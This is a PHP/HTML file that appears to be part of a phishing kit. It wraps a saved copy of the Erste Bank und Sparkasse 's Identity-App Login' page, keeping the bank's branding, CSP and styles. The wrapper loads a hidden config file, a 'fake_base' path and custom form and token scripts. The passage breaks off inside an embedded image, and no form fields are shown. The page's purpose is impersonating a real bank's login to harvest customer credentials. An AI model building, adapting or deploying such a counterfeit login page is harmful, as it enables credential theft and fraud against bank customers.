
<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="info/";
?>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery.maskedinput/dist/jquery.maskedinput.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="stylesheet" href="form/css.css">
	
	
<!DOCTYPE html><html lang="en" class="noIE"><head>
<link rel="icon" data-savepage-href="https://login.sparkasse.at/favicon.ico" href="data:image/x-icon;base64,AAABAAEAEBAQAAAABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAEAAAABAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAgICAAMDAwAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA">
	<title>Erste Bank und Sparkasse - s Identity-App Login</title>  
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta charset="utf-8">
	<meta http-equiv="Content-Security-Policy" data-savepage-content="connect-src 'self' https://127.0.0.1:*/ https://login.sparkasse.at;connect-src_DEV_LATEST 'self' https://127.0.0.1:*/ https://login.dev-latest.sparkasse.at;connect-src_DEV_STABLE 'self' https://127.0.0.1:*/ https://login.dev.sparkasse.at;connect-src_FAT_LATEST 'self' https://127.0.0.1:*/ https://login.fat.sparkasse.at;connect-src_FAT_STABLE 'self' https://127.0.0.1:*/ https://login.fat2.sparkasse.at;connect-src_PROD 'self' https://127.0.0.1:*/ https://login.sparkasse.at;default-src 'none';font-src 'self';img-src 'self' 'unsafe-inline' data: *.sparkasse.at https://login.sparkasse.at https://assets.erstegroup.com;img-src_DEV_LATEST 'self' 'unsafe-inline' data: *.sparkasse.at https://login.dev.sparkasse.at https://assets.erstegroup.com;img-src_DEV_STABLE 'self' 'unsafe-inline' data: *.sparkasse.at https://login.dev.sparkasse.at https://assets.erstegroup.com;img-src_FAT_LATEST 'self' 'unsafe-inline' data: *.sparkasse.at https://login.fat.sparkasse.at https://assets.erstegroup.com;img-src_FAT_STABLE 'self' 'unsafe-inline' data: *.sparkasse.at https://login.fat2.sparkasse.at https://assets.erstegroup.com;img-src_PROD 'self' 'unsafe-inline' data: *.sparkasse.at https://login.sparkasse.at https://assets.erstegroup.com;script-src 'self' 'unsafe-inline' 'unsafe-eval' https://login.sparkasse.at;script-src_DEV_LATEST 'self' 'unsafe-inline' 'unsafe-eval' https://login.dev-latest.sparkasse.at;script-src_DEV_STABLE 'self' 'unsafe-inline' 'unsafe-eval' https://login.dev.sparkasse.at;script-src_FAT_LATEST 'self' 'unsafe-inline' 'unsafe-eval' https://login.fat.sparkasse.at;script-src_FAT_STABLE 'self' 'unsafe-inline' 'unsafe-eval' https://login.fat2.sparkasse.at;script-src_PROD 'self' 'unsafe-inline' 'unsafe-eval' https://login.sparkasse.at;style-src 'self' 'unsafe-inline'" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<link rel="shortcut icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAQAAAAAAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAwAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAwMDAAICAgAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAmZmZmZkAAAmZmZmZmZAACZmZmZmZkAAAAAAACZmQAAmZmZmZmZAACZmZmZmZkAAJmZmZmZmQAAmZkAAAAAAACZmZmZmZkAAJmZmZmZmQAACZmZmZmQAAAAAAAAAAAAAAAACZAAAAAAAACZmQAAAAAAAJmZAAAAAAAACZAAAADgB///wAP//8AD////w///wAP//8AD///AA///w////8AD///AA///4Af////////+f////D////w////+f///">
	<style data-savepage-href="/sts/styles/lib.css" type="text/css">/************************************************************************
* Lib.css for Federated Login Erste Bank, sIT/OSP/Georg Zeglovits
*------------------------------------------------------------------------
*
* Font Declaration
************************************************************************/

@font-face {
    font-family: 'open_sansregular';
    src: url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.eot');
    src: url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.eot#iefix') format('embedded-opentype');
    src: url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.woff') format('woff'),
         url('OpenSans/webfonts/opensans_regular/OpenSans-Regular-webfont.ttf') format('truetype');
    font-weight:normal;
    font-weight:400;
         
}
@font-face {
    font-family: 'open_sanssemibold';
    src: url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.eot');
    src: url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.eot?#iefix') format('embedded-opentype');
    src: url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.woff') format('woff'),
         url('OpenSans/webfonts/opensans_semibold/OpenSans-Semibold-webfont.ttf') format('truetype');
    font-weight:bold;
    font-weight:700;
}



/************************************************************************
* general Styles
************************************************************************/
*{
    box-sizing:border-box;
    -webkit-box-sizing:border-box;
    -moz-box-sizing:border-box;
    -o-box-sizing:border-box;
    -ms-box-sizing:border-box; 
    padding:0; 
    margin:0;
    color:#0d5487;
    -webkit-border-radius:0;
    -webkit-appearance: none;
    }
body{
    background:#bce4fa;
    font:16px/20px 'open_sansregular',Arial,sans-serif;
    }

b{
    font-weight:700;
    font-family:'open_sanssemibold',Arial,sans-serif;
}    
    
div.wrapper{
    width:610px; 
    margin:124px auto 30px auto;
    overflow:hidden;
    }
div.col{
    display:block;
    width:50%;
    float:left;
    padding:0 20px 14px;
    }
div.col2{      
    position:relative;
    padding:0;
    }
div.col2 >.whitebox, div.col2 > div.whitebox-info{
    background:#fff;
    border-radius:4px;
    padding:14px 14px 0 14px; 
    height:320px; 
    width:100%;
    position:absolute;
}
div.col1 > h1 > img{
    max-width:90%;
    }
.whitebox > h1{
   font-size:1.125rem;
   padding-bottom:3px;
   font-family: 'open_sanssemibold',Arial,sans-serif;
}

div.col1{
    padding-left:0;
    }
div.product{
    border-top:solid 1px #fff;
    margin-top:14px;
    padding-top:14px;
    line-height:1.25rem;
    }
div.product h2{
    font-family: 'open_sanssemibold',Arial,sans-serif;
    font-size:1rem;
    }    
    
div.number, div.password {
    position:relative;
    overflow:hidden; 
    width:100%;
    height:45px;
    }
div.number > label.number, div.password > label.password{
    position:absolute;
    top:7px;
    left:49px;
    z-index:2;
    color:#ccd7e1;
    font-size:16px;
    line-height:1.5rem;
    }
div.number > input.input, div.password > input.input{
    position:absolute;
    top:0;
    left:40px;
    border:solid 1px #ccd7e1;
    border-left:none;
    border-top-right-radius:3px;
    border-bottom-right-radius:3px;
    height:40px;
    margin:0;
    padding:5px 9px;
    width:230px;
    font-size:16px;
    color:#555;
    }
    
div.number > input.input:disabled, div.password > input.input:disabled{
    background:rgb(235, 235, 228);
}
div.number > input.input{
    -moz-appearance:textfield;
}
.hasBgImage{
    background-repeat:no-repeat;
    background-color:#fff;
    background-image: url(data:image/png;base64,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);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTYyLjYyN3B4IiBoZWlnaHQ9IjI3LjEyNXB4IiB2aWV3Qm94PSIwIDAgMTYyLjYyNyAyNy4xMjUiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDE2Mi42MjcgMjcuMTI1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xNy4yMzcsMTcuMTc2Yy0yLjI5NS0wLjk3NC0yLjgzOS0xLjMxMy0yLjgzOS0xLjMxM2wtMC4wMjEtMi4yNGMwLDAsMC44Ni0wLjY3MywxLjEyNy0yLjc4Mg0KCWMwLjUzNywwLjE1OSwxLjEwMy0wLjgxNiwxLjEzMy0xLjMzYzAuMDI5LTAuNDk1LTAuMDc0LTEuODY4LTAuNzMtMS43M2MwLjEzNC0xLjAzNCwwLjIzMS0xLjk2NCwwLjE4NC0yLjQ1Ng0KCWMtMC4xNzEtMS44MDEtMS45MTEtMy42OTktNC41ODktMy42OTljLTIuNjc4LDAtNC40MjEsMS44OTctNC41OTIsMy42OThDNi44NjMsNS44MTYsNi45NjEsNi43NDYsNy4wOTUsNy43OA0KCWMtMC42NTYtMC4xMzgtMC43NiwxLjIzNS0wLjczLDEuNzNjMC4wMzEsMC41MTQsMC41OTQsMS40ODksMS4xMzMsMS4zM2MwLjI2NywyLjEwOSwxLjEyNywyLjc4MiwxLjEyNywyLjc4MmwtMC4wMjEsMi4yNDENCgljMCwwLTAuNTQ1LDAuMzM4LTIuODM5LDEuMzEyYy0yLjI5NiwwLjk3NC00LjYxNCwxLjY1NC01LjMwNCwyLjc1Yy0wLjYxOSwwLjk4MS0wLjQzNCw1LjY5OS0wLjQzNCw1LjY5OWgyMi45NDgNCgljMCwwLDAuMTg2LTQuNzE4LTAuNDM0LTUuNjk5QzIxLjg1MSwxOC44MywxOS41MzIsMTguMTQ4LDE3LjIzNywxNy4xNzZ6Ii8+DQo8Zz4NCgk8cGF0aCBmaWxsPSJub25lIiBkPSJNNDMuMjUsMTUuNWMtMS4zNDgsMC0yLjQzOCwxLjAwOC0yLjQzOCwyLjI1YzAsMC44MzIsMC40OTIsMS41NTksMS4yMiwxLjk0N3YyLjU1M2gyLjQzN3YtMi41NTMNCgkJYzAuNzI5LTAuMzkxLDEuMjE5LTEuMTE1LDEuMjE5LTEuOTQ3QzQ1LjY4OCwxNi41MDgsNDQuNTk2LDE1LjUsNDMuMjUsMTUuNXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMzYuNzUsNy42MjV2M2gzLjI0OXYtM2MwLjAwMy0wLjc3MiwwLjMxMy0xLjUzMiwwLjk1Mi0yLjEyMWMwLjY0LTAuNTg5LDEuNDYxLTAuODc3LDIuMjk5LTAuODc5DQoJCWMwLjgzNiwwLjAwMiwxLjY1OSwwLjI5LDIuMjk5LDAuODc5YzAuNjM3LDAuNTg5LDAuOTQ4LDEuMzQ5LDAuOTUxLDIuMTIxdjNoMy4yNDl2LTNjMC4wMDItMS41My0wLjYzOC0zLjA3NS0xLjkwMy00LjI0Mg0KCQljLTEuMjY1LTEuMTY5LTIuOTM4LTEuNzYxLTQuNTk2LTEuNzU4Yy0xLjY1OS0wLjAwMy0zLjMzMiwwLjU4OS00LjU5OCwxLjc1OEMzNy4zODcsNC41NSwzNi43NDcsNi4wOTUsMzYuNzUsNy42MjV6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTUyLjk5OSwyNC4xMjV2LTEwLjVjMC0wLjM4NC0wLjE1OC0wLjc2OC0wLjQ3Ni0xLjA2MXMtMC43MzItMC40MzktMS4xNDgtMC40MzlIMzUuMTI0DQoJCWMtMC40MTYsMC0wLjgzMSwwLjE0Ni0xLjE0OSwwLjQzOWMtMC4zMTUsMC4yOTMtMC40NzUsMC42NzctMC40NzUsMS4wNjF2MTAuNWMwLDAuMzg0LDAuMTU4LDAuNzY4LDAuNDc1LDEuMDYxDQoJCWMwLjMxOCwwLjI5MywwLjczMywwLjQzOSwxLjE0OSwwLjQzOWgxNi4yNTFjMC40MTYsMCwwLjgzMS0wLjE0NiwxLjE0OC0wLjQzOVM1Mi45OTksMjQuNTA5LDUyLjk5OSwyNC4xMjV6IE00NC40NjgsMTkuNjk3djIuNTUzDQoJCWgtMi40Mzd2LTIuNTUzYy0wLjcyOS0wLjM5MS0xLjIyMS0xLjExNS0xLjIyMS0xLjk0N2MwLTEuMjQyLDEuMDkyLTIuMjUsMi40MzgtMi4yNXMyLjQzNywxLjAwOCwyLjQzNywyLjI1DQoJCUM0NS42ODgsMTguNTgyLDQ1LjE5NSwxOS4zMDksNDQuNDY4LDE5LjY5N3oiLz4NCjwvZz4NCjxwYXRoIGZpbGw9IiNDQzAwMDAiIGQ9Ik0xNjIuNDk2LDI2LjE1OWwtNy44MTctMTMuNjM3Yy0wLjMwMy0wLjUzLTAuODAxLTAuNTMtMS4xMDUsMGwtNy44MTgsMTMuNjM3DQoJYy0wLjMwMywwLjUzLTAuMDUsMC45NjYsMC41NjMsMC45NjZoMTUuNjE5QzE2Mi41NSwyNy4xMjUsMTYyLjgwNCwyNi42ODksMTYyLjQ5NiwyNi4xNTkgTTE1My40MzEsMTYuMDU3aDEuMzk0DQoJYzAuNDIsMCwwLjQ3OSwwLjI0MywwLjQ3OSwwLjM4OWwtMC4wMDQsMC4xMjdsLTAuMDEsMC4xNDZsLTAuMjg2LDUuMDljLTAuMDQyLDAuMzgxLTAuMjExLDAuNDU3LTAuNDkxLDAuNDU3aC0wLjc0Mg0KCWMtMC4yODEsMC0wLjQ1My0wLjA3Ni0wLjQ5NC0wLjQ2N2wtMC4yODUtNS4wOGwtMC4wMTItMC4xNDZsLTAuMDA0LTAuMTI3QzE1Mi45NzYsMTYuMywxNTMuMDM1LDE2LjA1NywxNTMuNDMxLDE2LjA1Nw0KCSBNMTU0LjE0NiwyNS44MzdjLTAuNzMxLDAtMS4zMjYtMC41ODktMS4zMjYtMS4zMTJjMC0wLjc0MiwwLjU4Mi0xLjMyMywxLjMyNi0xLjMyM2MwLjcyNywwLDEuMzE1LDAuNTk0LDEuMzE1LDEuMzIzDQoJQzE1NS40NjIsMjUuMjM0LDE1NC44NTgsMjUuODM3LDE1NC4xNDYsMjUuODM3Ii8+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNNzQuNjg2LDIuMTQyYy02LjM0OCwwLTExLjQ5LDUuMTQyLTExLjQ5LDExLjQ5YzAsNi4zNDcsNS4xNDQsMTEuNDg5LDExLjQ5LDExLjQ4OQ0KCWM2LjM0NiwwLDExLjQ4OS01LjE0MywxMS40ODktMTEuNDg5Qzg2LjE3NSw3LjI4NCw4MS4wMzEsMi4xNDIsNzQuNjg2LDIuMTQyeiBNNzcuNDk1LDIwLjc3bC0wLjExNiwwLjA0NQ0KCWMtMC42ODgsMC4yNzEtMS4yMzQsMC40NzgtMS42NDYsMC42MTljLTAuNDMzLDAuMTUtMC45MzcsMC4yMjgtMS40OTgsMC4yMjhjLTAuODgzLDAtMS41ODgtMC4yMjQtMi4wOS0wLjY2Ng0KCWMtMC41MTMtMC40NTEtMC43NzEtMS4wMjktMC43NzEtMS43MjJjMC0wLjI1MiwwLjAxOC0wLjUxLDAuMDU1LTAuNzcyYzAuMDM1LTAuMjU4LDAuMDkyLTAuNTQ5LDAuMTctMC44NzdsMC44NTYtMy4wMzMNCgljMC4wNzMtMC4yOCwwLjEzNy0wLjU1MSwwLjE4OC0wLjgwNmMwLjA0OS0wLjI0MiwwLjA3Mi0wLjQ2NiwwLjA3Mi0wLjY2YzAtMC4zMTItMC4wNTYtMC41My0wLjE2Mi0wLjYzNA0KCWMtMC4wNjQtMC4wNi0wLjI0NC0wLjE2LTAuNzQ4LTAuMTZjLTAuMTk3LDAtMC4zOTgsMC4wMzEtMC42MTEsMC4wOTRjLTAuMjI3LDAuMDY2LTAuNDIsMC4xMzEtMC41OCwwLjE5bC0wLjQzLDAuMTZsMC4zNjUtMS40OTYNCglsMC4xMTUtMC4wNDZjMC41NTQtMC4yMjYsMS4xMDItMC40MjUsMS42MjQtMC41OTFjMS41MTUtMC40NzksMi44MzYtMC4yNzEsMy41ODgsMC40MDFjMC40OTksMC40NDUsMC43NTIsMS4wMjcsMC43NTIsMS43MjkNCgljMCwwLjEzNi0wLjAxOSwwLjM3NC0wLjA0NywwLjcxN2MtMC4wMzMsMC4zNDItMC4wOTUsMC42NjQtMC4xODMsMC45NThsLTAuODUxLDMuMDFjLTAuMDY5LDAuMjM2LTAuMTI5LDAuNTA0LTAuMTgzLDAuODA1DQoJYy0wLjA1MSwwLjI5My0wLjA3NywwLjUxMi0wLjA3NywwLjY2MmMwLDAuMzE2LDAuMDYyLDAuNTM1LDAuMTc5LDAuNjMxYzAuMDkyLDAuMDc0LDAuMzAxLDAuMTYyLDAuNzc3LDAuMTYyDQoJYzAuMTg2LDAsMC4zOTgtMC4wMzMsMC42MzgtMC4xYzAuMjQ0LTAuMDY2LDAuNDIxLTAuMTI1LDAuNTI4LTAuMTc4bDAuNDYzLTAuMjIxTDc3LjQ5NSwyMC43N3ogTTc3LjMwNSw4LjUzMQ0KCWMtMC40MzgsMC40MS0wLjk3OSwwLjYxOS0xLjYsMC42MTljLTAuNjE5LDAtMS4xNTktMC4yMDgtMS42MDQtMC42MTljLTAuNDQ5LTAuNDE1LTAuNjc5LTAuOTI2LTAuNjc5LTEuNTE4DQoJYzAtMC41OTIsMC4yMjgtMS4xMDQsMC42NzctMS41MjRjMC44OTMtMC44MjksMi4zMjEtMC44MjgsMy4yMDUsMGMwLjQ0NiwwLjQxOSwwLjY3NCwwLjkzMSwwLjY3NCwxLjUyMw0KCUM3Ny45NzksNy42MDUsNzcuNzUyLDguMTE2LDc3LjMwNSw4LjUzMXoiLz4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik05NS40MDMsMTMuNzgyYy0zLjEzMiwwLTUuNjcxLDIuNTM4LTUuNjcxLDUuNjcyYzAsMy4xMzUsMi41MzksNS42NzMsNS42NzEsNS42NzMNCgljMy4xMzQsMCw1LjY3My0yLjUzOCw1LjY3My01LjY3M0MxMDEuMDc2LDE2LjMyLDk4LjUzNywxMy43ODIsOTUuNDAzLDEzLjc4MnogTTk1LjYxNywyMi43NjVjLTAuMTg3LDAuMTc3LTAuNDAzLDAuMjY1LTAuNjUyLDAuMjY1DQoJYy0wLjI1MywwLTAuNDcyLTAuMDg4LTAuNjU3LTAuMjY1Yy0wLjE4Ni0wLjE3Ni0wLjI3OS0wLjM4OC0wLjI3OS0wLjYzM2MwLTAuMjQ2LDAuMDk0LTAuNDU5LDAuMjc5LTAuNjM4DQoJYzAuMTg2LTAuMTgsMC40MDQtMC4yNywwLjY1Ny0wLjI3YzAuMjQ5LDAsMC40NjYsMC4wOSwwLjY1MiwwLjI3YzAuMTg3LDAuMTc5LDAuMjc5LDAuMzkyLDAuMjc5LDAuNjM4DQoJQzk1Ljg5NiwyMi4zNzcsOTUuODA0LDIyLjU4OSw5NS42MTcsMjIuNzY1eiBNOTYuOTczLDE5LjQzOWMtMC40NDYsMC40MDQtMS4wNDEsMC42MzUtMS43ODUsMC42OTNsLTAuMDI4LDAuNjZoLTAuNDMydi0xLjg4Nw0KCWMwLjQ2OC0wLjAzOSwwLjgzNS0wLjE4NywxLjEwMS0wLjQ0NGMwLjI2Ni0wLjI1NywwLjM5OC0wLjYwNiwwLjM5OC0xLjA1MWMwLTAuMzUyLTAuMDk0LTAuNjM0LTAuMjc5LTAuODQ1DQoJYy0wLjE4Ni0wLjIxMy0wLjQzNi0wLjMxOC0wLjc1LTAuMzE4Yy0wLjEzMywwLTAuMjUsMC4wMTQtMC4zNTQsMC4wNDFjLTAuMTAzLDAuMDI3LTAuMjAzLDAuMDctMC4zLDAuMTI4DQoJYzAuMDMxLDAuMTA0LDAuMDcsMC4yMzcsMC4xMTMsMC40MDFjMC4wNDQsMC4xNjMsMC4wNjYsMC4zMTMsMC4wNjYsMC40NTNjMCwwLjIyNi0wLjA3NCwwLjQwMS0wLjIyMSwwLjUyNg0KCWMtMC4xNDcsMC4xMjQtMC4zNTMsMC4xODctMC42MTQsMC4xODdjLTAuMjQ1LDAtMC40MzgtMC4wNzctMC41OC0wLjIzM2MtMC4xNDEtMC4xNTUtMC4yMTEtMC4zNDYtMC4yMTEtMC41NzINCgljMC0wLjM3MSwwLjIxMi0wLjY4NywwLjYzNi0wLjk0NXMwLjkzNi0wLjM4OCwxLjUzMy0wLjM4OGMwLjcwOSwwLDEuMjgxLDAuMTg0LDEuNzIsMC41NTNjMC40MzgsMC4zNjksMC42NTcsMC44NTQsMC42NTcsMS40Ng0KCUM5Ny42NDMsMTguNTA4LDk3LjQxOSwxOS4wMzYsOTYuOTczLDE5LjQzOXoiLz4NCjxnPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTAuMTY3LDE2LjIwMmgtMC44OTRjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDgtMC4yMDEsMC40NDgtMC40NDd2LTAuODk1QzExMC42MTUsMTYuNDAzLDExMC40MTMsMTYuMjAyLDExMC4xNjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTEuODA3LDE3Ljk5MWgwLjg5NGMwLjI0NywwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NWMwLTAuMjQ2LTAuMi0wLjQ0Ny0wLjQ0Ny0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMS4zNTksMTcuNzksMTExLjU2MSwxNy45OTEsMTExLjgwNywxNy45OTF6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwxNy45OTFoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMTcuNzksMTE0LjA5NCwxNy45OTEsMTE0LjM0LDE3Ljk5MXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTE3Ljc2NywxNi4yMDJoLTAuODk0Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzExOC4yMTQsMTYuNDAzLDExOC4wMTMsMTYuMjAyLDExNy43NjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjAuMzAxLDE2LjIwMmgtMC44OTVjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxNi40MDMsMTIwLjU0NywxNi4yMDIsMTIwLjMwMSwxNi4yMDJ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTYuMjAyaC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjIwMS0wLjQ0NiwwLjQ0N3YwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTIzLjI4LDE2LjQwMywxMjMuMDc5LDE2LjIwMiwxMjIuODMzLDE2LjIwMnoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTEwLjE2NywxOC43MzZoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMi0wLjQ0NiwwLjQ0NnYwLjg5NWMwLDAuMj